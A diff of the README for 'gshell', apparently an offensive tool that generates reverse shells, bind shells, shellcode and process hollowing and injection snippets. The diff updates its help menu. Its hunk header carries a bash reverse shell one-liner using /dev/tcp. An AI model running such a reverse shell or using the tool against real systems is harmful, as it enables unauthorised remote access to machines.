@@ -107,14 +107,15 @@ bash -i >& /dev/tcp/$ip/$port 0>&1
 This is the help menu:
 
 ```powershell
-PS C:\gshell> python .\gshell.py -h                                            
-usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [-t, <Target OS>] [--base64] [--base32] [--base16] [--url] [--no-block] [-l] [-a] [-h]
+PS C:\gshell> python .\gshell.py -h                                       
+usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [--srev] [--sbind] [--windows] [--linux] [--base64] [--base32] [--base16] [--url]
+                 [--no-block] [-l] [-a] [-h]
 
- ██████  ███████ ██   ██ ███████ ██      ██      
-██       ██      ██   ██ ██      ██      ██      
-██   ███ ███████ ███████ █████   ██      ██      
-██    ██      ██ ██   ██ ██      ██      ██      
- ██████  ███████ ██   ██ ███████ ███████ ███████ 
+ ██████  ███████ ██   ██ ███████ ██      ██
+██       ██      ██   ██ ██      ██      ██
+██   ███ ███████ ███████ █████   ██      ██
+██    ██      ██ ██   ██ ██      ██      ██
+ ██████  ███████ ██   ██ ███████ ███████ ███████
 
 Generate shellcodes, bind shells and/or reverse shells with style
 
@@ -138,10 +139,12 @@ Snippets Types:
   --hollowing           Print process hollowing code snippets
   --injector            Print process injector code snippets
 
-Shellcode Options:
-  --shellcode           Generate reverse shell shellcodes, requires --target as well
-  -t, <Target OS>, --target <Target OS>
-                        Shellcode for a specific operating system (Windows or Linux)
+Shellcode Required Options:
+  --shellcode           Generate shellcodes, requires --srev or --sbind and --windows or --linux
+  --srev                Reverse shell shellcode
+  --sbind               Bind shell shellcode
+  --windows             Windows shellcode
+  --linux               Linux shellcode
 
 Encoding Options:
   --base64              Add base64 encoding
